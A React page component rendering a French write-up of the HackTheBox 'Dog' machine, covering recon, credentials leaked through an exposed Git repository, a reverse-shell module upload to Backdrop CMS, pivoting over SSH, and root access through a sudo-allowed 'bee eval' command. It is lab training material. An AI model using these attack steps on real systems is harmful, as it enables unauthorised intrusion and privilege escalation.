import React from 'react';
import { Terminal, Shield, Target, Code, Clock, Award, PenTool as Tool, BookOpen, ArrowRight, Database, Lock } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

export const WriteupDog: React.FC = () => {
  const navigate = useNavigate();

  return (
    <article className="max-w-4xl mx-auto px-6 py-12">
      {/* En-tête */}
      <div className="mb-8 flex items-center gap-4">
        <button
          onClick={() => navigate('/writeups')}
          className="flex items-center gap-2 px-4 py-2 bg-green-500/10 text-green-300 
                   rounded-lg hover:bg-green-500/20 transition-all duration-300"
        >
          <ArrowRight className="w-4 h-4 transform rotate-180" />
          <span>Retour aux write-ups</span>
        </button>
      </div>

      <header className="text-center mb-12 space-y-4">
        <h1 className="text-4xl font-bold bg-gradient-to-r from-green-400 to-green-600 bg-clip-text text-transparent">
          HackTheBox: Dog - Analyse Complète
        </h1>
        <div className="flex items-center justify-center gap-4">
          <span className="text-sm bg-green-500/10 text-green-300 px-3 py-1 rounded-full flex items-center gap-2">
            <Target className="w-4 h-4" />
            HackTheBox
          </span>
          <span className="text-sm bg-green-500/10 text-green-300 px-3 py-1 rounded-full flex items-center gap-2">
            <Shield className="w-4 h-4" />
            Easy
          </span>
          <span className="text-sm bg-green-500/10 text-green-300 px-3 py-1 rounded-full flex items-center gap-2">
            <Award className="w-4 h-4" />
            20 points
          </span>
        </div>
      </header>

      {/* Kali Header */}
      <div className="kali-header mb-8">
        <div className="difficulty">Difficulté: Easy</div>
        <div className="points">Points: 20</div>
        <div className="os">OS: Linux</div>
      </div>

      {/* Contenu principal */}
      <div className="prose prose-invert max-w-none">
        {/* Phase 1: Reconnaissance */}
        <div className="bg-[#1a1a1f] p-6 rounded-lg border border-green-900/20 mb-8">
          <h2 className="text-xl font-semibold text-green-400 mb-6">Phase 1: Reconnaissance</h2>
          
          <div className="mb-6">
            <h3 className="text-lg font-semibold mb-3">Scan Initial</h3>
            <div className="bg-[#2a2a2f] p-4 rounded-lg mb-4">
              <pre className="text-sm text-green-300">
                <code>
                  $ nmap dog.htb -sV -A -Pn -T4{'\n\n'}
                  PORT   STATE SERVICE VERSION{'\n'}
                  22/tcp open  ssh     OpenSSH 8.2p1{'\n'}
                  80/tcp open  http    Apache 2.4.41 (Ubuntu)
                </code>
              </pre>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
              <div className="bg-[#2a2a2f] p-4 rounded-lg">
                <h4 className="font-medium text-green-400 mb-2">Services Détectés</h4>
                <ul className="space-y-1 text-sm text-gray-400">
                  <li>• SSH (Port 22)</li>
                  <li>• HTTP (Port 80)</li>
                </ul>
              </div>
              <div className="bg-[#2a2a2f] p-4 rounded-lg">
                <h4 className="font-medium text-green-400 mb-2">Versions</h4>
                <ul className="space-y-1 text-sm text-gray-400">
                  <li>• OpenSSH 8.2p1</li>
                  <li>• Apache 2.4.41</li>
                </ul>
              </div>
            </div>
          </div>

          <div>
            <h3 className="text-lg font-semibold mb-3">Énumération Web</h3>
            <div className="bg-[#2a2a2f] p-4 rounded-lg mb-4">
              <pre className="text-sm text-green-300">
                <code>
                  $ dirsearch -u http://dog.htb -e php,txt,html{'\n\n'}
                  [+] Starting dirsearch...{'\n'}
                  [+] Target: http://dog.htb/{'\n\n'}
                  [15:30:12] 200 -  /.git/         🔥 GIT LEAK DETECTED{'\n'}
                  [15:30:15] 200 -  /contest.php   {'\n'}
                  [15:30:18] 200 -  /view_cat.php  {'\n'}
                  [15:30:20] 403 -  /config.php
                </code>
              </pre>
            </div>
            <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
              <div className="flex items-center gap-2 mb-2">
                <Shield className="w-5 h-5 text-green-400" />
                <h4 className="font-medium text-green-400">Points Critiques</h4>
              </div>
              <ul className="space-y-2 text-sm text-gray-300">
                <li>• Dépôt Git exposé</li>
                <li>• CMS Backdrop détecté</li>
                <li>• Fichiers de configuration potentiellement accessibles</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Phase 2: Exploitation Web */}
        <div className="bg-[#1a1a1f] p-6 rounded-lg border border-green-900/20 mb-8">
          <h2 className="text-xl font-semibold text-green-400 mb-6">Phase 2: Exploitation Web</h2>
          
          <div className="mb-6">
            <h3 className="text-lg font-semibold mb-3">Accès à l'administration du CMS</h3>
            <div className="bg-[#2a2a2f] p-4 rounded-lg mb-4">
              <div className="flex items-center gap-2 mb-2">
                <Database className="w-4 h-4 text-green-400" />
                <span className="text-green-400 font-medium">Identifiants MySQL trouvés dans settings.php</span>
              </div>
              <pre className="text-sm text-green-300">
                <code>
                  $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';{'\n\n'}
                  # Connexion avec :{'\n'}
                  Tiffany:BackDropJ2024DS2024
                </code>
              </pre>
            </div>
          </div>

          <div>
            <h3 className="text-lg font-semibold mb-3">Exploitation via Upload de Module</h3>
            <div className="bg-[#2a2a2f] p-4 rounded-lg mb-4">
              <div className="flex items-center gap-2 mb-2">
                <Terminal className="w-4 h-4 text-green-400" />
                <span className="text-green-400 font-medium">Création du module malveillant</span>
              </div>
              <pre className="text-sm text-green-300">
                <code>
                  # Téléchargement et modification d'un module officiel{'\n'}
                  # Ajout du reverse shell{'\n'}
                  $ tar -czvf shell.tar.gz *{'\n\n'}
                  # Mise en place du listener{'\n'}
                  $ nc -lvnp 4444{'\n'}
                  Listening on 0.0.0.0 4444
                </code>
              </pre>
            </div>
          </div>
        </div>

        {/* Phase 3: Mouvement Latéral */}
        <div className="bg-[#1a1a1f] p-6 rounded-lg border border-green-900/20 mb-8">
          <h2 className="text-xl font-semibold text-green-400 mb-6">Phase 3: Mouvement Latéral</h2>
          
          <div className="mb-6">
            <h3 className="text-lg font-semibold mb-3">Accès MySQL & Utilisateurs</h3>
            <div className="bg-[#2a2a2f] p-4 rounded-lg mb-4">
              <pre className="text-sm text-green-300">
                <code>
                  # Connexion MySQL{'\n'}
                  $ mysql -u root -pBackDropJ2024DS2024{'\n\n'}
                  # Résultats :{'\n'}
                  - Hash de jobert non cassable{'\n'}
                  - Mot de passe MySQL valide pour johncusack{'\n\n'}
                  # Connexion SSH{'\n'}
                  $ ssh johncusack@dog.htb{'\n\n'}
                  # Récupération du flag user{'\n'}
                  $ cat /home/johncusack/user.txt
                </code>
              </pre>
            </div>
          </div>
        </div>

        {/* Phase 4: Escalade de Privilèges */}
        <div className="bg-[#1a1a1f] p-6 rounded-lg border border-green-900/20 mb-8">
          <h2 className="text-xl font-semibold text-green-400 mb-6">Phase 4: Escalade de Privilèges</h2>
          
          <div className="mb-6">
            <h3 className="text-lg font-semibold mb-3">Analyse des Permissions Sudo</h3>
            <div className="bg-[#2a2a2f] p-4 rounded-lg mb-4">
              <pre className="text-sm text-green-300">
                <code>
                  $ sudo -l{'\n\n'}
                  User johncusack may run the following commands as root:{'\n'}
                  (root) /usr/local/bin/bee
                </code>
              </pre>
            </div>
          </div>

          <div>
            <h3 className="text-lg font-semibold mb-3">Exploitation de Bee CLI</h3>
            <div className="bg-[#2a2a2f] p-4 rounded-lg mb-4">
              <div className="flex items-center gap-2 mb-2">
                <Lock className="w-4 h-4 text-green-400" />
                <span className="text-green-400 font-medium">Exécution de code PHP en tant que root</span>
              </div>
              <pre className="text-sm text-green-300">
                <code>
                  # Dans /var/www/html{'\n'}
                  $ sudo /usr/local/bin/bee eval 'exec("/bin/bash -p");'{'\n\n'}
                  # Vérification{'\n'}
                  # whoami{'\n'}
                  root{'\n\n'}
                  # Récupération du flag root{'\n'}
                  # cd /root{'\n'}
                  # cat root.txt
                </code>
              </pre>
            </div>
          </div>
        </div>

        {/* Timeline */}
        <div className="bg-[#1a1a1f] p-6 rounded-lg border border-green-900/20 mb-8">
          <h2 className="text-xl font-semibold text-green-400 mb-6">Timeline</h2>
          <div className="timeline">
            <div className="timeline-item pb-4">
              <div className="flex items-center gap-2 text-green-400 font-medium">
                <Clock className="w-4 h-4" />
                <span>00:00 - Reconnaissance</span>
              </div>
              <p className="text-sm text-gray-400 mt-1">Scan initial et découverte du Git leak</p>
            </div>
            <div className="timeline-item pb-4">
              <div className="flex items-center gap-2 text-green-400 font-medium">
                <Clock className="w-4 h-4" />
                <span>00:15 - Exploitation Web</span>
              </div>
              <p className="text-sm text-gray-400 mt-1">Exploitation du CMS via upload de module</p>
            </div>
            <div className="timeline-item pb-4">
              <div className="flex items-center gap-2 text-green-400 font-medium">
                <Clock className="w-4 h-4" />
                <span>00:30 - Mouvement Latéral</span>
              </div>
              <p className="text-sm text-gray-400 mt-1">Accès MySQL et pivot vers johncusack</p>
            </div>
            <div className="timeline-item pb-4">
              <div className="flex items-center gap-2 text-green-400 font-medium">
                <Clock className="w-4 h-4" />
                <span>00:45 - Élévation de Privilèges</span>
              </div>
              <p className="text-sm text-gray-400 mt-1">Exploitation de Bee CLI pour obtenir root</p>
            </div>
          </div>
        </div>

        {/* Conclusion */}
        <div className="bg-[#1a1a1f] p-6 rounded-lg border border-green-900/20">
          <h2 className="text-xl font-semibold text-green-400 mb-6">Conclusion</h2>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div>
              <h3 className="font-medium text-green-400 mb-3">Points Clés</h3>
              <ul className="space-y-2 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <Shield className="w-4 h-4 text-green-400 mt-1" />
                  <span>Git leak exposant des credentials</span>
                </li>
                <li className="flex items-start gap-2">
                  <Shield className="w-4 h-4 text-green-400 mt-1" />
                  <span>Upload de module malveillant dans le CMS</span>
                </li>
                <li className="flex items-start gap-2">
                  <Shield className="w-4 h-4 text-green-400 mt-1" />
                  <span>Exploitation de binaire SUID pour root</span>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-medium text-green-400 mb-3">Apprentissages</h3>
              <ul className="space-y-2 text-sm text-gray-300">
                <li className="flex items-start gap-2">
                  <BookOpen className="w-4 h-4 text-green-400 mt-1" />
                  <span>Importance de la reconnaissance approfondie</span>
                </li>
                <li className="flex items-start gap-2">
                  <BookOpen className="w-4 h-4 text-green-400 mt-1" />
                  <span>Sécurisation des dépôts Git en production</span>
                </li>
                <li className="flex items-start gap-2">
                  <BookOpen className="w-4 h-4 text-green-400 mt-1" />
                  <span>Validation des uploads de modules CMS</span>
                </li>
              </ul>
            </div>
          </div>

          <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
            <p className="text-green-400 text-sm italic">
              Cette machine illustre parfaitement l'importance de la sécurisation des dépôts Git et 
              de la validation des uploads dans les CMS. Un excellent exemple pour les débutants en 
              pentesting web.
            </p>
          </div>
        </div>
      </div>
    </article>
  );
};